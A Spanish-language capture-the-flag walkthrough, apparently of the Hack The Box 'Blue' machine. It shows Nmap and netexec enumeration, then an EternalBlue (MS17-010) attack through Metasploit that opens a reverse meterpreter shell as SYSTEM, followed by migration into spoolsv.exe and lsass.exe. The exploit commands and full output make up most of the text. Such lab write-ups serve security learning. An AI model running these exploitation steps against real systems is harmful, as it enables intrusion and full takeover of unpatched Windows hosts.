>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blue]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.42.79
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 10:05 EST
Nmap scan report for 10.129.42.79
Host is up (0.059s latency).
Not shown: 65394 closed tcp ports (reset), 132 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.54 seconds
```

>Vemos al hacer enumeración básica con netexec que **SMBv1** está en **True** y es un **Windows 7** lo que llama a gritos una vulnerabilidad de **Eternal Blue**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blue]
└─$ nxc smb 10.129.42.79                                         
SMB         10.129.42.79    445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True) (Null Auth:True)
```

>Usamos el módulo de metasploit para explotar el **EternalBlue** o también conocido como **MS17-010** para ganar una shell de **meterpreter**:

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.71
LHOST => 10.10.14.71
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.42.79
RHOSTS => 10.129.42.79
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.71:4444 
[*] 10.129.42.79:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.42.79:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.38, but the operating system provides version 2.41.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.42.79:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.42.79:445 - The target is vulnerable.
[*] 10.129.42.79:445 - Connecting to target for exploitation.
[+] 10.129.42.79:445 - Connection established for exploitation.
[+] 10.129.42.79:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.42.79:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.42.79:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.42.79:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.42.79:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.42.79:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.42.79:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.42.79:445 - Sending all but last fragment of exploit packet
[*] 10.129.42.79:445 - Starting non-paged pool grooming
[+] 10.129.42.79:445 - Sending SMBv2 buffers
[+] 10.129.42.79:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.42.79:445 - Sending final SMBv2 buffers.
[*] 10.129.42.79:445 - Sending last fragment of exploit packet!
[*] 10.129.42.79:445 - Receiving response from exploit packet
[+] 10.129.42.79:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.42.79:445 - Sending egg to corrupted connection.
[*] 10.129.42.79:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 10.129.42.79
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.38, but the operating system provides version 2.41.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
[*] Meterpreter session 1 opened (10.10.14.71:4444 -> 10.129.42.79:49158) at 2026-01-15 10:11:29 -0500
[+] 10.129.42.79:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.42.79:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.42.79:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

>Aunque veamos que ya somos **NT AUTHORITY\SYSTEM**, deberíamos migrar a un proceso privilegiado ya que el nuestro puede ser que no tenga todos los tokens disponibles:

```bash
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeTcbPrivilege                Act as part of the operating system       Enabled 
SeAuditPrivilege              Generate security audits                  Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

>Vamos a listar los procesos activos y nos quedamos con el PID del **spooler service** ya que es un servicio que corre en nombre del usuario **NT AUTHORITY\SYSTEM**:

```bash
meterpreter > ps

Process List
============
 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
<SNIP>
1036  468   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
<SNIP>
```

>Migramos al proceso del **spoolsv.exe** pero como vemos, el exploit ya automáticamente migró a este proceso para tener más privilegios así que ya tendríamos una shell como el usuario más privilegiado del sistema:

```bash
meterpreter > migrate 1036
[-] Process already running at PID 1036
```

>Pero no nos vamos a quedar con esto, vamos a migrar al proceso **lsass.exe** y vamos a comprobar que ahora tenemos más tokens de privilegio que antes cuando estábamos en el **spoolsv.exe**, completando la escalada de privilegios:

```bash
meterpreter > migrate 492
[*] Migrating from 1036 to 492...
[*] Migration completed successfully.
meterpreter > shell
Process 2272 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                   State   
=============================== ============================================= ========
SeCreateTokenPrivilege          Create a token object                         Enabled 
SeAssignPrimaryTokenPrivilege   Replace a process level token                 Disabled
SeLockMemoryPrivilege           Lock pages in memory                          Enabled 
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process            Disabled
SeTcbPrivilege                  Act as part of the operating system           Enabled 
SeSecurityPrivilege             Manage auditing and security log              Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects      Disabled
SeLoadDriverPrivilege           Load and unload device drivers                Disabled
SeSystemProfilePrivilege        Profile system performance                    Enabled 
SeSystemtimePrivilege           Change the system time                        Disabled
SeProfileSingleProcessPrivilege Profile single process                        Enabled 
SeIncreaseBasePriorityPrivilege Increase scheduling priority                  Enabled 
SeCreatePagefilePrivilege       Create a pagefile                             Enabled 
SeCreatePermanentPrivilege      Create permanent shared objects               Enabled 
SeBackupPrivilege               Back up files and directories                 Disabled
SeRestorePrivilege              Restore files and directories                 Disabled
SeShutdownPrivilege             Shut down the system                          Disabled
SeDebugPrivilege                Debug programs                                Enabled 
SeAuditPrivilege                Generate security audits                      Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values            Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled 
SeUndockPrivilege               Remove computer from docking station          Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks              Disabled
SeImpersonatePrivilege          Impersonate a client after authentication     Enabled 
SeCreateGlobalPrivilege         Create global objects                         Enabled 
SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
SeRelabelPrivilege              Modify an object label                        Disabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                Enabled 
SeTimeZonePrivilege             Change the time zone                          Enabled 
SeCreateSymbolicLinkPrivilege   Create symbolic links                         Enabled 
```
